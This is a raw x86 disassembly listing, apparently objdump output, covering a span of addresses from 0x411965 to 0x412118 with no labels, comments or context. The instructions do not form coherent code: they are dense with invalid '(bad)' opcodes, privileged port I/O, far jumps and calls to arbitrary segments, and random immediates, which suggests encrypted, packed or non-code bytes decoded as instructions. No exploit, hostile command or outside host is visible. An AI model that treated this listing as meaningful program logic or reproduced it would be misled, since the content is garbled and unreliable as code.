  411965:	xor    DWORD PTR [esi+0x13],0xffffffd0
  411969:	outs   dx,BYTE PTR ds:[esi]
  41196a:	jge    0x4118ec
  41196c:	xchg   ecx,eax
  41196d:	xor    al,0x3e
  41196f:	add    DWORD PTR [eax-0x8bf7ab1],0x2a
  411976:	mov    al,ds:0x8fb31509
  41197b:	push   esi
  41197c:	inc    ecx
  41197d:	cli    
  41197e:	sar    cl,cl
  411980:	and    ch,BYTE PTR [edi]
  411982:	lods   al,BYTE PTR ds:[esi]
  411983:	outs   dx,BYTE PTR ds:[esi]
  411984:	mov    WORD PTR [esi-0x76462857],?
  41198a:	jle    0x4119a8
  41198c:	cwde   
  41198d:	(bad)  
  41198f:	and    eax,esp
  411991:	and    al,0xa7
  411993:	add    bl,bh
  411995:	vhaddpd xmm2,xmm5,xmm5
  41199a:	in     eax,dx
  41199b:	test   BYTE PTR [ebx+0x4d46bfba],al
  4119a1:	jg     0x4119eb
  4119a3:	lds    ecx,FWORD PTR [edi+0x22]
  4119a6:	and    ah,BYTE PTR [esi]
  4119a8:	xor    BYTE PTR [eax+0x49],dh
  4119ab:	sub    bl,BYTE PTR [edi]
  4119ad:	pop    ebp
  4119ae:	mov    DWORD PTR [ebx+edi*4+0x16b8e902],esp
  4119b5:	xchg   edi,eax
  4119b6:	icebp  
  4119b7:	icebp  
  4119b8:	in     eax,dx
  4119b9:	xor    eax,DWORD PTR [edi-0x12]
  4119bc:	les    eax,FWORD PTR ds:0xce55e34b
  4119c2:	fmul   QWORD PTR [eax+0xc2a94d1]
  4119c8:	test   al,cl
  4119ca:	ds pop es
  4119cc:	(bad)  
  4119cd:	xor    ecx,esp
  4119cf:	out    0xa4,eax
  4119d1:	push   edi
  4119d2:	jmp    0xd75ddbe7
  4119d7:	sub    ch,BYTE PTR [eax+eax*8+0x9afa9c9]
  4119de:	sbb    dl,dl
  4119e0:	push   0x54
  4119e2:	xor    BYTE PTR [ecx+0x4e7aaea2],cl
  4119e8:	shl    DWORD PTR ds:0x727c5960,1
  4119ee:	into   
  4119ef:	(bad)  
  4119f0:	out    dx,eax
  4119f1:	cdq    
  4119f2:	rcl    BYTE PTR [ebp+eax*8+0x17d0318b],cl
  4119f9:	sbb    al,dl
  4119fb:	in     eax,dx
  4119fc:	jmp    FWORD PTR [edi+0x0]
  4119ff:	add    bl,BYTE PTR [edx-0xd]
  411a02:	inc    ecx
  411a03:	nop
  411a04:	pop    edx
  411a05:	cli    
  411a06:	arpl   WORD PTR [eax],bp
  411a08:	xchg   esp,eax
  411a09:	pop    ebp
  411a0a:	scas   al,BYTE PTR es:[edi]
  411a0b:	mov    al,0x1e
  411a0d:	or     ah,BYTE PTR [ebx]
  411a0f:	and    al,0xa5
  411a11:	scas   eax,DWORD PTR es:[edi]
  411a12:	pop    ebp
  411a13:	into   
  411a14:	pop    eax
  411a15:	cmp    edi,DWORD PTR [ebx]
  411a17:	test   eax,0xafd09da7
  411a1c:	stos   BYTE PTR es:[edi],al
  411a1d:	or     eax,0xbc310029
  411a22:	dec    eax
  411a23:	cmp    al,bh
  411a25:	add    esp,esp
  411a27:	add    eax,0x45fecbdd
  411a2c:	sub    bl,BYTE PTR [ecx]
  411a2e:	sub    esi,DWORD PTR [eax+0x49]
  411a31:	inc    ebx
  411a32:	popa   
  411a33:	ja     0x411a0c
  411a35:	lock int3 
  411a37:	push   ss
  411a38:	out    dx,al
  411a39:	push   ds
  411a3a:	and    al,0xf3
  411a3c:	idiv   BYTE PTR [eax+0x38]
  411a3f:	sbb    BYTE PTR [ebp-0x30],bh
  411a42:	mov    edi,0x83b9de8b
  411a47:	jmp    0xbd62:0x766d8103
  411a4e:	push   ebx
  411a4f:	(bad)  
  411a50:	loop   0x411a1b
  411a52:	aad    0x80
  411a54:	sub    al,0xc
  411a56:	test   DWORD PTR [ebp+0x64c8171b],ecx
  411a5c:	xchg   edi,eax
  411a5d:	push   eax
  411a5e:	test   al,0xe6
  411a60:	sbb    DWORD PTR [ebx-0x1f848f04],esi
  411a66:	das    
  411a67:	mov    ebp,0xb29b6f0
  411a6c:	clc    
  411a6d:	inc    ecx
  411a6e:	sub    bl,0xff
  411a71:	sub    cl,BYTE PTR [eax+0x4e8424]
  411a77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a78:	outs   dx,BYTE PTR ds:[esi]
  411a79:	pop    esi
  411a7a:	shl    BYTE PTR [ecx+0x53913adf],cl
  411a80:	mov    al,ds:0x72d0e33
  411a85:	mov    eax,0x9144af2b
  411a8a:	out    0x5a,eax
  411a8c:	sbb    edi,DWORD PTR [edi]
  411a8e:	out    0xa0,eax
  411a90:	fs test eax,0x5cb51c94
  411a96:	dec    esi
  411a97:	sub    al,0xfb
  411a99:	xor    eax,0x316bf196
  411a9e:	mov    esp,0x6dd62d0e
  411aa3:	inc    ecx
  411aa4:	loope  0x411b16
  411aa6:	int3   
  411aa7:	fnsave [ebp-0x3d1045]
  411aad:	popa   
  411aae:	mov    eax,ds:0x21cc5058
  411ab3:	mov    dl,0x11
  411ab5:	jmp    0x81f31b0b
  411aba:	adc    ecx,DWORD PTR [edi]
  411abc:	aaa    
  411abd:	(bad)  
  411abe:	scas   al,BYTE PTR es:[edi]
  411abf:	stc    
  411ac0:	popa   
  411ac1:	call   0x8e22:0x5038e560
  411ac8:	test   al,0x1d
  411aca:	jmp    0x2c7d4b46
  411acf:	push   ds
  411ad0:	adc    ah,ch
  411ad2:	stc    
  411ad3:	jl     0x411ace
  411ad5:	inc    esp
  411ad6:	movsx  esi,WORD PTR [eax]
  411ad9:	je     0x411afa
  411adb:	(bad)  
  411adc:	cmp    DWORD PTR [ebp-0x6c7488ab],ebp
  411ae2:	mov    BYTE PTR [edx-0x4b58f18f],dl
  411ae8:	dec    esi
  411ae9:	jge    0x411afa
  411aeb:	fdiv   QWORD PTR [eax+esi*4+0x1f]
  411aef:	mov    ah,0x42
  411af1:	imul   ebp,edi,0x3de38742
  411af7:	inc    esi
  411af8:	sti    
  411af9:	(bad)  
  411afb:	jo     0x411a87
  411afd:	jmp    0x411b70
  411aff:	sbb    DWORD PTR [esi-0x3af67b88],ebx
  411b05:	push   ds
  411b06:	and    al,0xdd
  411b08:	rol    BYTE PTR ds:0xa6bbc571,cl
  411b0e:	imul   eax,DWORD PTR [ecx-0x5c],0xa7136b19
  411b15:	push   0x32d15b2b
  411b1a:	out    0x6,al
  411b1c:	xchg   esp,eax
  411b1d:	mov    ch,0x40
  411b1f:	jg     0x411ab1
  411b21:	scas   eax,DWORD PTR es:[edi]
  411b22:	lock add dl,BYTE PTR [ecx-0xad54f8a]
  411b29:	adc    eax,0x485e7c6d
  411b2e:	enter  0xc1e9,0x93
  411b32:	and    BYTE PTR [ebp+0x7a],dl
  411b35:	sub    al,0x47
  411b37:	clc    
  411b38:	jp     0x411abc
  411b3a:	mov    eax,0xca4dbfd7
  411b3f:	xor    DWORD PTR [edx-0x19d71aa3],eax
  411b45:	(bad)  
  411b46:	push   ebx
  411b47:	inc    esi
  411b48:	sbb    eax,ebp
  411b4a:	fdivr  st,st(7)
  411b4c:	(bad)  
  411b4d:	into   
  411b4e:	push   0xba63e9ab
  411b53:	dec    eax
  411b54:	inc    eax
  411b55:	ins    DWORD PTR es:[edi],dx
  411b56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b57:	and    BYTE PTR [ecx-0x559c9a12],dh
  411b5d:	stos   BYTE PTR es:[edi],al
  411b5e:	leave  
  411b5f:	loop   0x411b05
  411b61:	jmp    0xc5ab:0x40a344fa
  411b68:	push   edi
  411b69:	fsubr  st,st(0)
  411b6b:	sti    
  411b6c:	and    DWORD PTR [ecx-0x6e],esp
  411b6f:	pop    esi
  411b70:	data16 sub ch,al
  411b73:	in     al,dx
  411b74:	push   ecx
  411b75:	and    eax,0x80cc2fe1
  411b7a:	xor    eax,0x1a0f1c45
  411b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b80:	stc    
  411b81:	inc    edi
  411b82:	aas    
  411b83:	(bad)  
  411b84:	retf   
  411b85:	add    al,0x9e
  411b87:	rol    BYTE PTR [ebx-0x2733895],0xa9
  411b8e:	enter  0x4f97,0x6c
  411b92:	out    0xfb,al
  411b94:	imul   esi,DWORD PTR [edx+ebp*8-0x527bc1c3],0x8640006f
  411b9f:	nop
  411ba0:	outs   dx,BYTE PTR es:[esi]
  411ba2:	adc    DWORD PTR [edi-0x39aeb8f8],ebx
  411ba8:	adc    bl,al
  411baa:	ds int3 
  411bac:	ins    BYTE PTR es:[edi],dx
  411bad:	pop    es
  411bae:	push   ebp
  411baf:	mov    ds:0x9fdd5c37,eax
  411bb4:	jmp    0xc838233f
  411bb9:	les    ebp,FWORD PTR [esi+edi*4+0x65b2459f]
  411bc0:	mov    ebp,0x8ac6732d
  411bc5:	mov    eax,0xe82cffa0
  411bca:	mov    ecx,esp
  411bcc:	xchg   DWORD PTR [ebx],esi
  411bce:	jge    0x411baa
  411bd0:	mov    al,0xaa
  411bd2:	loope  0x411bcc
  411bd4:	inc    eax
  411bd5:	shl    DWORD PTR [esi],cl
  411bd7:	mov    bh,0x93
  411bd9:	push   ecx
  411bda:	or     eax,edi
  411bdc:	dec    edx
  411bdd:	inc    edi
  411bde:	ss pusha 
  411be0:	sbb    DWORD PTR [ecx-0x25],ebp
  411be3:	ja     0x411bb4
  411be5:	jb     0x411c10
  411be7:	dec    esp
  411be8:	xor    dh,BYTE PTR [edi-0xbe373b2]
  411bee:	stos   DWORD PTR es:[edi],eax
  411bef:	pop    eax
  411bf0:	dec    ebp
  411bf1:	pop    eax
  411bf2:	hlt    
  411bf3:	cli    
  411bf4:	scas   al,BYTE PTR es:[edi]
  411bf5:	mov    DWORD PTR [esp+edi*4],0x3c26beb5
  411bfc:	pop    ecx
  411bfd:	lahf   
  411bfe:	pop    esi
  411bff:	adc    DWORD PTR [edi],eax
  411c01:	dec    eax
  411c02:	mov    edx,0x7ea446d7
  411c07:	aas    
  411c08:	retf   0x9c98
  411c0b:	(bad)
  411c10:	or     eax,esp
  411c12:	call   0x6f:0xe6cbd543
  411c19:	in     al,0xe3
  411c1b:	stos   DWORD PTR es:[edi],eax
  411c1c:	cmp    al,0x7e
  411c1e:	add    al,0xd5
  411c20:	fisttp WORD PTR [ebx]
  411c22:	sub    al,0x1
  411c24:	enter  0x2b3c,0x3e
  411c28:	ret    
  411c29:	push   ebp
  411c2a:	sub    DWORD PTR [esi+0x49],ebp
  411c2d:	or     al,0x67
  411c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c30:	ret    
  411c31:	inc    edx
  411c32:	sbb    DWORD PTR [ecx+0x44],ebp
  411c35:	jae    0x411c04
  411c37:	xchg   esp,eax
  411c38:	loope  0x411c8d
  411c3a:	mov    bl,0x1
  411c3c:	xor    BYTE PTR [esi],cl
  411c3e:	mov    esi,0x7b532055
  411c43:	es aam 0x12
  411c46:	mov    eax,ds:0x9c5cb2ca
  411c4b:	sti    
  411c4c:	mov    al,ds:0xda023e0c
  411c51:	xor    eax,0x2ea2b0ea
  411c56:	loopne 0x411c47
  411c58:	popa   
  411c59:	xsha1  (bad)
  411c5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c5b:	mov    ah,BYTE PTR [edi-0xc0b450f]
  411c61:	push   cs
  411c62:	cmp    BYTE PTR [edx],ah
  411c64:	inc    edi
  411c65:	mov    dh,0x2a
  411c67:	add    eax,0x6a15fc5f
  411c6c:	jnp    0x411cd8
  411c6e:	sbb    ebx,DWORD PTR [edx+0x45]
  411c71:	jl     0x411c83
  411c73:	jp     0x411c52
  411c75:	pop    ebp
  411c76:	ss std 
  411c78:	sti    
  411c79:	call   0xedff:0x896a0c01
  411c80:	xor    BYTE PTR [eax+0x239668ea],ch
  411c86:	call   0x36e9c504
  411c8b:	mov    edx,0x2dd87317
  411c90:	adc    cl,0x59
  411c93:	(bad)  
  411c94:	mov    esp,0x2e56ef47
  411c99:	pushf  
  411c9a:	fdiv   st(5),st
  411c9c:	nop
  411c9d:	fbld   TBYTE PTR [esi+0x3884fdee]
  411ca3:	repz ss retf 0x4304
  411ca8:	adc    bl,BYTE PTR [ebp-0x3c8f7f99]
  411cae:	loop   0x411d1c
  411cb0:	xchg   esi,eax
  411cb1:	iret   
  411cb2:	sbb    DWORD PTR [ebp-0x76],ecx
  411cb5:	cmp    DWORD PTR [edi+0x750e9a54],eax
  411cbb:	cld    
  411cbc:	adc    cl,BYTE PTR [eax-0x5]
  411cbf:	or     ecx,esi
  411cc1:	lods   eax,DWORD PTR ds:[esi]
  411cc2:	jns    0x411d1d
  411cc4:	jmp    0x411cc3
  411cc6:	jmp    0xe52d:0xbfa11dba
  411ccd:	lock cwde 
  411ccf:	retf   0x8c79
  411cd2:	and    edi,0x1f
  411cd5:	repz xchg ebp,eax
  411cd7:	and    ebp,DWORD PTR [edi+0x12]
  411cda:	and    al,0x61
  411cdc:	sbb    al,0x8e
  411cde:	adc    DWORD PTR [esi],esp
  411ce0:	xor    BYTE PTR [edx+0x51483cb8],ah
  411ce6:	ret    
  411ce7:	dec    ebx
  411ce8:	jle    0x411c78
  411cea:	mov    dl,0xaa
  411cec:	sbb    cl,ah
  411cee:	out    0x43,eax
  411cf0:	or     eax,0x1b748d43
  411cf5:	loope  0x411d54
  411cf7:	xchg   edi,eax
  411cf8:	mov    ebx,0x7d770b75
  411cfd:	mov    ds:0xf700eca1,eax
  411d02:	aaa    
  411d03:	out    dx,eax
  411d04:	mov    edi,DWORD PTR [edx+0x581f8ecc]
  411d0a:	jno    0x411d1c
  411d0c:	xchg   ebx,eax
  411d0d:	shr    ch,cl
  411d0f:	jmp    0xc1380ae6
  411d14:	imul   esi,DWORD PTR [edi-0x54],0x76
  411d18:	adc    ecx,esp
  411d1a:	or     al,0x99
  411d1c:	lock xchg edx,eax
  411d1e:	aaa    
  411d1f:	sbb    DWORD PTR [ecx],esp
  411d21:	addr16 aad 0xf3
  411d24:	rol    dh,cl
  411d26:	out    0xfd,eax
  411d28:	stos   BYTE PTR es:[edi],al
  411d29:	mov    ebx,0x7647b1fd
  411d2e:	nop
  411d2f:	cmp    al,BYTE PTR [edi-0x31]
  411d32:	jo     0x411d50
  411d34:	in     al,0xbc
  411d36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d37:	jecxz  0x411d4a
  411d39:	(bad)  
  411d3a:	fdivr  QWORD PTR [esi]
  411d3c:	cmp    al,BYTE PTR [edi-0x5a]
  411d3f:	mov    cl,0x15
  411d41:	cmc    
  411d42:	pop    esi
  411d43:	scas   al,BYTE PTR es:[edi]
  411d44:	mov    bh,0x26
  411d46:	stc    
  411d47:	push   ebp
  411d48:	jne    0x411d6b
  411d4a:	xor    ah,bh
  411d4c:	bsr    ebp,esi
  411d4f:	je     0x411dae
  411d51:	and    al,0x40
  411d53:	and    ecx,DWORD PTR ds:0xda1b0916
  411d59:	das    
  411d5a:	or     al,0xdb
  411d5c:	jp     0x411db4
  411d5e:	adc    al,0x4a
  411d60:	mov    cl,0x8c
  411d62:	sbb    eax,0xd3f32ffc
  411d67:	aas    
  411d68:	or     DWORD PTR [edi+0x5f],ecx
  411d6b:	add    eax,0x93ae8710
  411d70:	xor    al,0x6
  411d72:	aad    0xdf
  411d74:	push   esp
  411d75:	mov    esp,0x1710be13
  411d7a:	call   0xe8c5:0x4b6a2332
  411d81:	pop    ebp
  411d82:	ja     0x411d79
  411d84:	pop    ebx
  411d85:	(bad)  
  411d86:	out    0x96,eax
  411d88:	mov    ebx,0xfc757072
  411d8d:	xchg   edx,eax
  411d8e:	call   0x8eb4:0x228ee664
  411d95:	or     DWORD PTR [esi],edx
  411d97:	xchg   ebp,eax
  411d98:	dec    ebx
  411d99:	jne    0x411e15
  411d9b:	mov    al,ds:0x779ddd81
  411da0:	jb     0x411d8b
  411da2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411da3:	or     ch,BYTE PTR [eax-0x15517f36]
  411da9:	cmp    bh,BYTE PTR [ebp-0xb]
  411dac:	jg     0x411dd6
  411dae:	and    BYTE PTR [edi-0x55],dh
  411db1:	or     bl,BYTE PTR [eax+0x51254a5e]
  411db7:	push   eax
  411db8:	cwde   
  411db9:	lods   eax,DWORD PTR ds:[esi]
  411dba:	and    al,0x21
  411dbc:	jle    0x411d54
  411dbe:	bound  eax,QWORD PTR [edi-0x17eb2845]
  411dc4:	loop   0x411d6c
  411dc6:	mov    esi,0x5763764b
  411dcb:	mov    ah,0x78
  411dcd:	or     edx,DWORD PTR [edi]
  411dcf:	jns    0x411e0d
  411dd1:	push   esi
  411dd2:	lods   al,BYTE PTR ds:[esi]
  411dd3:	mov    ds:0xab72534b,eax
  411dd8:	sbb    edx,edi
  411dda:	sub    BYTE PTR [edi+0x3],ah
  411ddd:	push   es
  411dde:	dec    ecx
  411ddf:	sub    esp,DWORD PTR [edi]
  411de1:	or     al,0xb6
  411de3:	mov    DWORD PTR [ecx],ebp
  411de5:	or     al,0x83
  411de7:	cs pop eax
  411de9:	das    
  411dea:	and    al,0xd
  411dec:	xchg   esi,eax
  411ded:	sbb    esp,edi
  411def:	mov    eax,ds:0xb2cabb65
  411df4:	jbe    0x411e54
  411df6:	test   DWORD PTR [edi+0x481d048],esp
  411dfc:	pop    es
  411dfd:	sub    DWORD PTR [eax+0x4c],esp
  411e00:	fmul   QWORD PTR ds:0xf973c029
  411e06:	inc    edx
  411e07:	push   eax
  411e08:	and    dh,BYTE PTR [esi*2+0x5c710fc5]
  411e0f:	in     al,dx
  411e10:	mov    esi,0x21c9b6d3
  411e15:	sbb    al,BYTE PTR [ecx+0xd]
  411e18:	adc    ah,BYTE PTR [ebx+0x3f69c435]
  411e1e:	test   DWORD PTR [edx],0x6b9cad6e
  411e24:	or     ch,cl
  411e26:	retf   0x173
  411e29:	loop   0x411e7a
  411e2b:	and    BYTE PTR [esi+eax*8+0x46e8d2ab],al
  411e32:	sub    DWORD PTR [edx],ebx
  411e34:	pop    ecx
  411e35:	adc    DWORD PTR [ecx-0x4e],ebx
  411e38:	sbb    eax,0xee67024
  411e3e:	pushf  
  411e3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e40:	xchg   BYTE PTR [ecx-0x1193ea9d],dl
  411e46:	sar    DWORD PTR [edi-0x1b],0xd
  411e4a:	jo     0x411e9a
  411e4c:	stos   DWORD PTR es:[edi],eax
  411e4d:	push   ss
  411e4e:	mov    esi,0x7822c2af
  411e53:	pop    ss
  411e54:	in     al,dx
  411e55:	das    
  411e56:	mov    ds:0x40d14c3a,al
  411e5b:	lods   al,BYTE PTR ds:[esi]
  411e5c:	pop    eax
  411e5d:	iret   
  411e5e:	lods   al,BYTE PTR ds:[esi]
  411e5f:	div    BYTE PTR ds:0x1f311db9
  411e65:	xchg   ebx,eax
  411e66:	cmp    ecx,DWORD PTR [ebx]
  411e68:	jmp    FWORD PTR [esi]
  411e6a:	dec    ebx
  411e6b:	cli    
  411e6c:	lods   al,BYTE PTR ds:[esi]
  411e6d:	clc    
  411e6e:	cwde   
  411e6f:	mov    dh,0x89
  411e71:	push   ss
  411e72:	adc    edx,edi
  411e74:	mov    dl,0x5e
  411e77:	adc    al,0x54
  411e79:	popf   
  411e7a:	and    eax,0xae324c0a
  411e7f:	push   esp
  411e80:	fistp  WORD PTR [edi]
  411e82:	rol    BYTE PTR [edx+0x10da8623],cl
  411e88:	mov    al,ds:0x1f621f0f
  411e8d:	jo     0x411f01
  411e8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411e90:	jl     0x411e45
  411e92:	cmp    BYTE PTR [esi-0x1f],dl
  411e95:	push   ss
  411e96:	scas   al,BYTE PTR es:[edi]
  411e97:	pop    ebp
  411e98:	jg     0x411e87
  411e9a:	in     eax,0xd1
  411e9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e9d:	or     DWORD PTR [ecx-0x46],0x7c90a309
  411ea4:	adc    DWORD PTR [ebx],ecx
  411ea6:	outs   dx,DWORD PTR ds:[esi]
  411ea7:	mov    ds,WORD PTR [esi+0x7ff3c812]
  411ead:	push   0x41ba179d
  411eb2:	idiv   esi
  411eb4:	xchg   ebp,eax
  411eb5:	ficom  WORD PTR [ebp+0x731be8ad]
  411ebb:	aam    0x34
  411ebd:	mov    ah,0x6e
  411ebf:	cmp    al,BYTE PTR [esi]
  411ec1:	cmp    bh,al
  411ec3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ec4:	(bad)  
  411ec5:	mov    eax,0x4836effc
  411eca:	adc    bl,dh
  411ecc:	inc    esi
  411ecd:	push   0xffffffba
  411ecf:	xor    ebx,DWORD PTR [esi]
  411ed1:	push   0x84661499
  411ed6:	jge    0x411f52
  411ed8:	shr    DWORD PTR [ebx+ebp*8+0x23a5adc8],1
  411edf:	lea    ecx,[esi+0x59]
  411ee2:	out    dx,al
  411ee3:	or     al,0xdc
  411ee5:	inc    edx
  411ee6:	addr16 cld 
  411ee8:	xor    ebp,0x3a1c647d
  411eee:	push   edi
  411eef:	pop    ebp
  411ef0:	cmp    al,BYTE PTR [eax+eax*2+0x75]
  411ef4:	scas   al,BYTE PTR es:[edi]
  411ef5:	outs   dx,BYTE PTR ds:[esi]
  411ef6:	jae    0x411e94
  411ef8:	or     DWORD PTR [ebp+0x35f9b801],esi
  411efe:	cmp    BYTE PTR [edx-0x55199757],dh
  411f04:	mov    bl,0xab
  411f06:	daa    
  411f07:	stc    
  411f08:	xchg   ebx,eax
  411f09:	icebp  
  411f0a:	nop
  411f0b:	sub    al,0x5d
  411f0d:	lds    ebx,FWORD PTR [ebx-0x54]
  411f10:	shr    DWORD PTR [si],cl
  411f13:	mov    BYTE PTR [eax-0xd4d26fa],dl
  411f19:	sbb    ah,BYTE PTR ds:0x99aa8f6a
  411f1f:	rcl    DWORD PTR [edx+0x30be104],cl
  411f25:	in     eax,dx
  411f26:	icebp  
  411f27:	dec    esi
  411f28:	push   edi
  411f29:	outs   dx,DWORD PTR ds:[esi]
  411f2a:	jae    0x411faa
  411f2c:	jmp    0x411f3a
  411f2e:	xlat   BYTE PTR ds:[ebx]
  411f2f:	pusha  
  411f30:	test   al,0x82
  411f32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f33:	pop    ecx
  411f34:	adc    DWORD PTR [ebx-0x51],esp
  411f37:	loopne 0x411f9d
  411f39:	mov    cl,bl
  411f3b:	adc    al,0x41
  411f3d:	(bad)  
  411f3e:	arpl   WORD PTR [ecx+0x39],dx
  411f41:	cld    
  411f42:	std    
  411f43:	xor    eax,0xa48c75d7
  411f48:	jnp    0x411f35
  411f4a:	cli    
  411f4b:	aaa    
  411f4c:	js     0x411f9b
  411f4e:	icebp  
  411f4f:	dec    edi
  411f50:	test   DWORD PTR [ebx-0x6d96e24f],eax
  411f56:	xor    al,BYTE PTR [edi]
  411f58:	hlt    
  411f59:	cmc    
  411f5a:	or     eax,0x92c4486d
  411f5f:	out    dx,eax
  411f60:	sti    
  411f61:	into   
  411f62:	inc    eax
  411f63:	add    eax,0xc09093ae
  411f68:	lahf   
  411f69:	xor    al,BYTE PTR [ecx]
  411f6b:	inc    eax
  411f6c:	pop    edx
  411f6d:	xor    WORD PTR [edi],bp
  411f70:	ret    
  411f71:	push   ebx
  411f72:	ss xchg esi,eax
  411f74:	xor    ecx,DWORD PTR [edi+0x1abe18d]
  411f7a:	mov    ebx,0xe8af2b10
  411f7f:	pop    ds
  411f80:	jp     0x411f18
  411f82:	or     esp,esp
  411f84:	iret   
  411f85:	jns    0x411f52
  411f87:	pop    ds
  411f88:	pop    edi
  411f8a:	xchg   ecx,eax
  411f8b:	xchg   ebx,eax
  411f8c:	xor    al,0x90
  411f8e:	int    0xe8
  411f90:	(bad)  [ecx]
  411f92:	dec    ebp
  411f93:	mov    esi,edx
  411f95:	sbb    BYTE PTR [edx-0x17d1fd68],dl
  411f9b:	pop    ebp
  411f9c:	adc    ebp,DWORD PTR [edx-0x3e]
  411f9f:	sub    DWORD PTR [edi+ecx*1+0x4dbf9b0e],ebp
  411fa6:	fsub   QWORD PTR [edx]
  411fa8:	push   ss
  411fa9:	sbb    DWORD PTR [esi],ecx
  411fab:	push   0x42d0bbd3
  411fb0:	ret    0xbb6a
  411fb3:	imul   ebp,DWORD PTR [edi-0xe],0x6c
  411fb7:	fistp  QWORD PTR [eax-0x5b1bb2af]
  411fbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fbe:	call   0x8bce8da6
  411fc3:	(bad)  
  411fc4:	xor    al,0x89
  411fc6:	shrd   DWORD PTR [edi-0x4],edx,cl
  411fca:	adc    ah,cl
  411fcc:	cmp    al,BYTE PTR [eax+0x3b]
  411fcf:	xor    eax,0x82228996
  411fd4:	lods   al,BYTE PTR ds:[esi]
  411fd5:	sti    
  411fd6:	or     BYTE PTR [ecx+0x3fb9306d],0xa5
  411fdd:	push   es
  411fde:	je     0x412028
  411fe0:	mov    eax,0x13ddf783
  411fe5:	sub    ebx,DWORD PTR [edi]
  411fe7:	add    BYTE PTR [edi-0x586d2ceb],0x7b
  411fee:	dec    esi
  411fef:	pop    edx
  411ff0:	cdq    
  411ff1:	ret    0x5351
  411ff4:	and    BYTE PTR [edi+0x2e],bh
  411ff7:	retf   
  411ff8:	sbb    ebp,edi
  411ffa:	call   0x8b01:0xd3918c9a
  412001:	xor    DWORD PTR [eax+0x65f6ec31],esp
  412007:	cmp    DWORD PTR [edi+0x7c],edi
  41200a:	lea    edx,[ecx]
  41200c:	cmc    
  41200d:	clc    
  41200e:	pop    edi
  41200f:	sub    esp,edx
  412011:	cmp    eax,0x2ab2a75
  412016:	mov    edi,0x6f95d3ec
  41201b:	sbb    al,0xd4
  41201d:	fld    QWORD PTR [eax-0x4e1595a0]
  412023:	in     al,dx
  412024:	adc    dl,BYTE PTR [esi+ebp*1-0x40]
  412028:	xor    esp,DWORD PTR [edx-0x7b65b863]
  41202e:	xchg   edx,eax
  41202f:	jo     0x412054
  412031:	adc    eax,0xa8e331c3
  412036:	enter  0x5e4e,0xb7
  41203a:	mov    bh,0x77
  41203c:	xchg   ebp,eax
  41203d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41203e:	push   edx
  41203f:	popa   
  412040:	arpl   WORD PTR [edx+ebx*1],cx
  412043:	and    BYTE PTR [ecx],cl
  412045:	sbb    dl,BYTE PTR ds:0xc782d00f
  41204b:	cli    
  41204c:	sub    eax,0x561eb8e0
  412051:	jae    0x41208b
  412053:	sbb    BYTE PTR [ecx+0x2f],0x50
  412057:	or     al,BYTE PTR [edx+0x2e]
  41205a:	push   ds
  41205b:	leave  
  41205c:	jns    0x41201b
  41205e:	out    0xbc,eax
  412060:	movntq QWORD PTR [esi-0x139ce043],mm3
  412067:	lahf   
  412068:	mov    dl,0xa1
  41206a:	or     BYTE PTR [ebx+0x45],bh
  41206d:	fstp   QWORD PTR ds:0xa8d0239a
  412073:	and    edi,ebp
  412075:	fdiv   DWORD PTR [eax+0xe]
  412078:	add    dl,bl
  41207a:	ss fs stos BYTE PTR es:[edi],al
  41207d:	adc    bl,al
  41207f:	sahf   
  412080:	enter  0xbb92,0x28
  412084:	jecxz  0x412012
  412086:	lahf   
  412087:	pushf  
  412088:	jbe    0x412093
  41208a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41208b:	hlt    
  41208c:	adc    al,0xef
  41208e:	imul   esi,DWORD PTR [esi-0x49],0x7316d767
  412095:	xchg   BYTE PTR [eax+0x426ead0],bl
  41209b:	test   DWORD PTR [esi-0x6d],edx
  41209e:	pop    edx
  41209f:	arpl   WORD PTR [ecx-0x47],bp
  4120a2:	shl    BYTE PTR [eax],cl
  4120a4:	fidiv  WORD PTR [edx-0x43]
  4120a7:	sbb    al,0xaf
  4120a9:	cmp    al,0x67
  4120ab:	imul   ebp,ecx,0xd28bd53e
  4120b1:	es pop esi
  4120b3:	fsub   QWORD PTR [edi+0x29]
  4120b6:	in     ax,0xf0
  4120b9:	ds aad 0xd
  4120bc:	dec    eax
  4120bd:	xlat   BYTE PTR ds:[ebx]
  4120be:	xchg   esi,eax
  4120bf:	test   eax,0x8045c80f
  4120c4:	aad    0x11
  4120c6:	fisub  DWORD PTR [eax]
  4120c8:	jmp    0xc0ea441a
  4120cd:	dec    eax
  4120ce:	push   0x74
  4120d0:	(bad)  
  4120d1:	out    0xe1,al
  4120d3:	in     eax,0xf2
  4120d5:	and    edx,DWORD PTR [ebp-0x881ee8d]
  4120db:	fisttp WORD PTR [ebp+edi*2-0x6bf26d06]
  4120e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4120e3:	outs   dx,BYTE PTR ds:[esi]
  4120e4:	bound  esi,QWORD PTR [edx-0xa]
  4120e7:	add    eax,0x25981509
  4120ec:	in     eax,0x82
  4120ee:	pop    esp
  4120ef:	pop    esp
  4120f0:	stc    
  4120f1:	ffreep st(3)
  4120f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4120f4:	xor    eax,0x8d0de684
  4120f9:	xchg   edx,eax
  4120fa:	lods   eax,DWORD PTR ds:[esi]
  4120fb:	lds    edx,FWORD PTR [edx]
  4120fd:	jl     0x4120f7
  4120ff:	(bad)
  412102:	xchg   edx,eax
  412103:	pop    esp
  412104:	mov    bl,0xd1
  412106:	push   ecx
  412107:	dec    edi
  412108:	sar    DWORD PTR [edx+0x5d],0x8c
  41210c:	xchg   edx,eax
  41210d:	sub    eax,0xefac746d
  412112:	mov    edx,0xee2087e4
  412117:	outs   dx,DWORD PTR ds:[esi]
  412118:	pop    ebx
